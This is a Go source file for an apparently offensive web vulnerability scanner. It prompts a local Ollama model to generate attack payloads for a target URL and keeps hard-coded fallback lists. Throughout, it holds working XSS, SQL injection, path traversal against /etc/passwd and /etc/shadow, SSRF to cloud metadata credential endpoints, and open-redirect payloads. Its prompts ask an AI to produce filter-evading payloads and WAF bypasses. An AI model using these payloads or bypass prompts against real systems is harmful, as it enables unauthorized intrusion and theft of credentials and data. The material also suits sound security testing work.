package exploit

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"strings"
)

// AIRequest represents Ollama API request
type AIRequest struct {
	Model  string `json:"model"`
	Prompt string `json:"prompt"`
	Stream bool   `json:"stream"`
}

// AIResponse represents Ollama API response
type AIResponse struct {
	Model     string `json:"model"`
	CreatedAt string `json:"created_at"`
	Response  string `json:"response"`
	Done      bool   `json:"done"`
}

// generateXSSPayloads asks AI to generate XSS payloads
func (s *Scanner) generateXSSPayloads(ctx context.Context, url, context string) ([]string, string) {
	prompt := fmt.Sprintf(`You are an expert penetration tester specializing in XSS exploitation.

Target URL: %s
Context: %s

Generate 10 ADVANCED XSS payloads that ACTUALLY WORK in real-world scenarios:

REQUIREMENTS:
1. Use WAF bypass techniques (case variation, encoding, obfuscation, mutation)
2. Include polyglot payloads that work in multiple contexts
3. Use modern JavaScript features (template literals, unicode, etc.)
4. Include DOM-based XSS payloads
5. Use event handlers that bypass filters (onanimationstart, ontoggle, etc.)
6. Include SVG-based and base64 encoded payloads
7. Use HTML5 tags that bypass old filters
8. Include payloads that work without parentheses or quotes

EXAMPLES OF GOOD PAYLOADS:
- <svg/onload=alert(1)>
- <img src=x onerror=alert\u0060{}\u0060>
- <details open ontoggle=alert(1)>
- <ScRiPt>alert(String.fromCharCode(88,83,83))</sCrIpT>
- "><svg/onload=eval(atob('YWxlcnQoMSk='))>
- <iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;">
- <math><mtext></mtext><annotation-xml encoding="text/html"><svg onload=alert(1)>

Return ONLY 10 payloads, one per line, no explanations, no numbers.`, url, context)

	response, err := s.callAI(ctx, prompt)
	if err != nil {
		// Advanced fallback payloads
		return []string{
			`<svg/onload=alert(1)>`,
			`<img src=x onerror=alert\x60{}\x60>`,
			`<details open ontoggle=alert(1)>`,
			`"><svg/onload=eval(atob('YWxlcnQoMSk='))>`,
			`<ScRiPt>alert(String.fromCharCode(88,83,83))</sCrIpT>`,
			`<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;">`,
			`<body onload=alert(1)>`,
			`<input autofocus onfocus=alert(1)>`,
			`<marquee onstart=alert(1)>`,
			`<math><mtext></mtext><annotation-xml encoding="text/html"><svg onload=alert(1)>`,
		}, "Using advanced fallback payloads (AI unavailable)"
	}

	payloads := strings.Split(strings.TrimSpace(response), "\n")
	reasoning := "AI generated context-aware payloads"

	return payloads, reasoning
}

// generateSQLiPayloads asks AI to generate SQL injection payloads
func (s *Scanner) generateSQLiPayloads(ctx context.Context, url, param string) ([]string, string) {
	prompt := fmt.Sprintf(`You are an expert SQL injection penetration tester.

Target URL: %s
Parameter: %s

Generate 15 ADVANCED SQL injection payloads that ACTUALLY WORK:

REQUIREMENTS:
1. Error-based SQLi (trigger database errors to confirm vulnerability)
2. Time-based blind SQLi (use SLEEP, WAITFOR, BENCHMARK)
3. Boolean-based blind SQLi (true/false conditions)
4. UNION-based SQLi (extract data using UNION SELECT)
5. WAF bypass techniques (comments, encoding, case variation, whitespace bypass)
6. Multi-database support (MySQL, PostgreSQL, MSSQL, Oracle, SQLite)
7. Stacked queries
8. Out-of-band SQLi (DNS/HTTP exfiltration)

EXAMPLES OF REAL PAYLOADS:
- ' OR '1'='1'-- -
- ' AND SLEEP(5)-- -
- ' UNION SELECT NULL,NULL,NULL-- -
- ' OR '1'='1'/**/-- -
- 1';WAITFOR DELAY '0:0:5'-- -
- ' AND 1=2 UNION SELECT table_name FROM information_schema.tables-- -
- ' OR 1=1#
- ' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -
- ' UNION ALL SELECT NULL,CONCAT(0x7e,version(),0x7e),NULL-- -
- admin'-- -
- ' OR 'x'='x
- 1' AND '1'='1
- ' OR 1=1 LIMIT 1-- -
- ' UNION SELECT NULL,NULL,NULL,database()-- -
- ' AND extractvalue(1,concat(0x7e,version()))-- -

Return ONLY 15 payloads, one per line, no explanations, no numbers.`, url, param)

	response, err := s.callAI(ctx, prompt)
	if err != nil {
		return []string{
			`'`,
			`' OR '1'='1'-- -`,
			`' AND SLEEP(5)-- -`,
			`' UNION SELECT NULL,NULL,NULL-- -`,
			`1';WAITFOR DELAY '0:0:5'-- -`,
			`' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -`,
			`admin'-- -`,
			`' OR 1=1#`,
			`' UNION ALL SELECT NULL,version(),NULL-- -`,
			`' AND extractvalue(1,concat(0x7e,version()))-- -`,
			`' OR 'x'='x`,
			`1' AND '1'='1`,
			`" OR "1"="1`,
			`' OR 1=1 LIMIT 1-- -`,
			`' UNION SELECT NULL,database(),NULL-- -`,
		}, "Using advanced fallback payloads (AI unavailable)"
	}

	payloads := strings.Split(strings.TrimSpace(response), "\n")
	return payloads, "AI generated SQL injection payloads"
}

// generatePathTraversalPayloads generates path traversal payloads via AI
func (s *Scanner) generatePathTraversalPayloads(ctx context.Context, url string) ([]string, string) {
	prompt := fmt.Sprintf(`You are an expert penetration tester specializing in Local File Inclusion (LFI) and Path Traversal.

Target URL: %s

Generate 15 ADVANCED path traversal/LFI payloads that BYPASS modern filters:

REQUIREMENTS:
1. Deep directory traversal (Linux: /etc/passwd, /etc/shadow, /proc/self/environ)
2. Windows paths (C:\Windows\win.ini, C:\boot.ini, C:\Windows\System32\drivers\etc\hosts)
3. URL encoding bypass (%2e%2e%2f, ..%252f)
4. Double encoding (%252e%252e%252f)
5. Unicode/UTF-8 encoding (%c0%ae%c0%ae/)
6. Null byte injection (..%00/)
7. Mixed slashes (..\/..\/../)
8. Dot segments (./../.../../)
9. Wrapper protocols (php://filter/convert.base64-encode/resource=, file://, zip://)
10. Absolute paths bypass

EXAMPLES OF REAL PAYLOADS:
- ../../../../etc/passwd
- ..%2F..%2F..%2F..%2Fetc%2Fpasswd
- ....//....//....//....//etc/passwd
- ..%252f..%252f..%252fetc%252fpasswd
- ....\/....\/....\/etc/passwd
- ../../../../../../../../etc/passwd%00
- php://filter/convert.base64-encode/resource=../../../../etc/passwd
- ../../../../proc/self/environ
- C:\Windows\System32\drivers\etc\hosts
- ../../../../var/log/apache2/access.log
- file:///etc/passwd
- ..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
- ../../../../../../../../../../windows/win.ini
- /var/www/../../etc/passwd
- expect://id

Return ONLY 15 payloads, one per line, no explanations.`, url)

	response, err := s.callAI(ctx, prompt)
	if err != nil {
		return []string{
			`../../../../etc/passwd`,
			`..%2F..%2F..%2F..%2Fetc%2Fpasswd`,
			`....//....//....//....//etc/passwd`,
			`..%252f..%252f..%252fetc%252fpasswd`,
			`....\/....\/....\/etc/passwd`,
			`../../../../../../../../etc/passwd%00`,
			`php://filter/convert.base64-encode/resource=../../../../etc/passwd`,
			`../../../../proc/self/environ`,
			`C:\Windows\System32\drivers\etc\hosts`,
			`../../../../var/log/apache2/access.log`,
			`file:///etc/passwd`,
			`..%c0%af..%c0%af..%c0%afetc%c0%afpasswd`,
			`../../../../../../../../../../windows/win.ini`,
			`/var/www/../../etc/passwd`,
			`../../../../etc/shadow`,
		}, "Using advanced fallback payloads"
	}

	payloads := strings.Split(strings.TrimSpace(response), "\n")
	return payloads, "AI generated path traversal payloads"
}

// generateSSRFPayloads generates SSRF payloads via AI
func (s *Scanner) generateSSRFPayloads(ctx context.Context, url string) ([]string, string) {
	prompt := fmt.Sprintf(`You are an expert penetration tester specializing in Server-Side Request Forgery (SSRF).

Target URL: %s

Generate 15 ADVANCED SSRF payloads that ACTUALLY WORK:

REQUIREMENTS:
1. Internal network access (localhost, 127.0.0.1, 0.0.0.0, [::1])
2. Cloud metadata endpoints (AWS, GCP, Azure, DigitalOcean)
3. URL parser bypass (@ symbol, URL encoding, decimal/hex IP)
4. Protocol smuggling (gopher, dict, file, ftp, jar)
5. DNS rebinding payloads
6. IPv6 payloads
7. Port scanning capabilities
8. Bypass IP blacklists (decimal, hex, octal notation)

EXAMPLES OF REAL PAYLOADS:
- http://127.0.0.1
- http://localhost
- http://169.254.169.254/latest/meta-data/
- http://metadata.google.internal/computeMetadata/v1/
- http://169.254.169.254/latest/meta-data/iam/security-credentials/
- http://[::1]
- http://0.0.0.0
- http://2130706433/ (decimal for 127.0.0.1)
- http://0x7f000001/ (hex for 127.0.0.1)
- http://127.1
- http://localhost.evil.com@127.0.0.1
- gopher://127.0.0.1:25/_MAIL
- dict://127.0.0.1:11211/stats
- file:///etc/passwd
- http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

Return ONLY 15 payloads, one per line, no explanations.`, url)

	response, err := s.callAI(ctx, prompt)
	if err != nil {
		return []string{
			`http://127.0.0.1`,
			`http://localhost`,
			`http://169.254.169.254/latest/meta-data/`,
			`http://metadata.google.internal/computeMetadata/v1/`,
			`http://169.254.169.254/latest/meta-data/iam/security-credentials/`,
			`http://[::1]`,
			`http://0.0.0.0`,
			`http://2130706433/`,
			`http://0x7f000001/`,
			`http://127.1`,
			`http://localhost.evil.com@127.0.0.1`,
			`gopher://127.0.0.1:25/_MAIL`,
			`dict://127.0.0.1:11211/stats`,
			`file:///etc/passwd`,
			`http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token`,
		}, "Using advanced fallback payloads"
	}

	payloads := strings.Split(strings.TrimSpace(response), "\n")
	return payloads, "AI generated SSRF payloads"
}

// generateOpenRedirectPayloads generates open redirect payloads
func (s *Scanner) generateOpenRedirectPayloads(ctx context.Context, url string) ([]string, string) {
	prompt := fmt.Sprintf(`You are an expert penetration tester testing for Open Redirect vulnerabilities.

Target URL: %s

Generate 15 ADVANCED open redirect payloads that BYPASS filters:

REQUIREMENTS:
1. Protocol-relative URLs (//evil.com)
2. URL encoding bypass (%2F%2Fevil.com, https%3A%2F%2Fevil.com)
3. Double encoding
4. JavaScript protocol (javascript:, data:)
5. Backslash bypass (\evil.com, /\evil.com)
6. @ symbol bypass (https://trusted.com@evil.com)
7. Whitespace bypass (https://evil.com with tabs/newlines)
8. Homograph attacks (evil.com vs Ðµvil.com)
9. Null byte bypass (https://evil.com%%00trusted.com)
10. Dot segments (https://trusted.com/../evil.com)

EXAMPLES OF REAL PAYLOADS:
- https://evil.com
- //evil.com
- /\evil.com
- https://trusted.com@evil.com
- https://evil.com%00.trusted.com
- javascript:alert(document.domain)
- //evil%E3%80%82com
- https://evil.com%09.trusted.com
- https://evil.com%0d%0atrusted.com
- /\/evil.com
- ///evil.com
- https:evil.com
- /evil.com/%2f..
- https://trusted.com/../../../evil.com
- data:text/html,<script>window.location='https://evil.com'</script>

Return ONLY 15 payloads, one per line, no explanations.`, url)

	response, err := s.callAI(ctx, prompt)
	if err != nil {
		return []string{
			`https://evil.com`,
			`//evil.com`,
			`/\evil.com`,
			`https://trusted.com@evil.com`,
			`https://evil.com%00.trusted.com`,
			`javascript:alert(document.domain)`,
			`//evil%E3%80%82com`,
			`https://evil.com%09.trusted.com`,
			`https://evil.com%0d%0atrusted.com`,
			`/\/evil.com`,
			`///evil.com`,
			`https:evil.com`,
			`/evil.com/%2f..`,
			`https://trusted.com/../../../evil.com`,
			`data:text/html,<script>window.location='https://evil.com'</script>`,
		}, "Using advanced fallback payloads"
	}

	payloads := strings.Split(strings.TrimSpace(response), "\n")
	return payloads, "AI generated redirect payloads"
}

// analyzeResponse asks AI to analyze if exploit worked
func (s *Scanner) analyzeResponse(ctx context.Context, vulnType, payload, response string, statusCode int) (bool, string, string) {
	prompt := fmt.Sprintf(`You are analyzing a security test response.

Vulnerability Type: %s
Payload Used: %s
Status Code: %d
Response (first 500 chars): %s

Did the exploit work? Look for:
- XSS: Payload reflected without encoding, JavaScript context
- SQLi: Database errors, syntax errors, timing differences
- Path Traversal: File contents (passwd, win.ini)
- SSRF: Internal IP responses, cloud metadata
- Open Redirect: Location header to external domain
- IDOR: Unauthorized data access
- JWT: Valid token manipulation

Answer with ONLY:
SUCCESS: [one line evidence]
or
FAIL: [one line reason]`, vulnType, payload, statusCode, truncate(response, 500))

	aiResponse, err := s.callAI(ctx, prompt)
	if err != nil {
		// Fallback to basic pattern matching
		return s.basicResponseAnalysis(vulnType, payload, response, statusCode)
	}

	aiResponse = strings.TrimSpace(aiResponse)

	if strings.HasPrefix(strings.ToUpper(aiResponse), "SUCCESS") {
		evidence := strings.TrimPrefix(aiResponse, "SUCCESS:")
		evidence = strings.TrimSpace(evidence)
		return true, evidence, "AI verified exploit success"
	}

	reason := strings.TrimPrefix(aiResponse, "FAIL:")
	return false, "", strings.TrimSpace(reason)
}

// basicResponseAnalysis fallback when AI is unavailable
func (s *Scanner) basicResponseAnalysis(vulnType, payload, response string, statusCode int) (bool, string, string) {
	response = strings.ToLower(response)

	switch VulnerabilityType(vulnType) {
	case VulnXSS:
		if strings.Contains(response, strings.ToLower(payload)) {
			return true, "Payload reflected in response", "Basic pattern match"
		}
	case VulnSQLi:
		sqlErrors := []string{"sql syntax", "mysql", "postgresql", "ora-", "sqlite", "syntax error"}
		for _, err := range sqlErrors {
			if strings.Contains(response, err) {
				return true, fmt.Sprintf("Database error: %s", err), "Error-based detection"
			}
		}
	case VulnPathTraversal:
		if strings.Contains(response, "root:") || strings.Contains(response, "[extensions]") {
			return true, "File contents leaked", "Pattern match"
		}
	case VulnSSRF:
		if strings.Contains(response, "169.254.169.254") || strings.Contains(response, "metadata") {
			return true, "Internal service accessed", "Pattern match"
		}
	}

	return false, "", "No vulnerability indicators found"
}

// suggestBypass asks AI to suggest WAF bypass
func (s *Scanner) suggestBypass(ctx context.Context, vulnType, blockedPayload, wafResponse string) ([]string, string) {
	prompt := fmt.Sprintf(`You are a security researcher. A WAF blocked your payload.

Vulnerability Type: %s
Blocked Payload: %s
WAF Response: %s

Suggest 3 bypass techniques:
1. Different encoding
2. Alternative syntax
3. Case manipulation

Return ONLY the modified payloads, one per line.`, vulnType, blockedPayload, truncate(wafResponse, 200))

	response, err := s.callAI(ctx, prompt)
	if err != nil {
		return []string{}, "WAF detected, no bypass suggestions available"
	}

	bypasses := strings.Split(strings.TrimSpace(response), "\n")
	return bypasses, "AI suggested WAF bypass techniques"
}

// callAI makes request to Ollama API
func (s *Scanner) callAI(ctx context.Context, prompt string) (string, error) {
	reqBody := AIRequest{
		Model:  s.aiModel,
		Prompt: prompt,
		Stream: false,
	}

	jsonData, err := json.Marshal(reqBody)
	if err != nil {
		return "", err
	}

	req, err := http.NewRequestWithContext(ctx, "POST", s.ollamaURL+"/api/generate", bytes.NewBuffer(jsonData))
	if err != nil {
		return "", err
	}

	req.Header.Set("Content-Type", "application/json")

	resp, err := s.client.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return "", fmt.Errorf("ollama API error: %d", resp.StatusCode)
	}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}

	var aiResp AIResponse
	if err := json.Unmarshal(body, &aiResp); err != nil {
		return "", err
	}

	return aiResp.Response, nil
}

// truncate truncates string to max length
func truncate(s string, maxLen int) string {
	if len(s) <= maxLen {
		return s
	}
	return s[:maxLen] + "..."
}
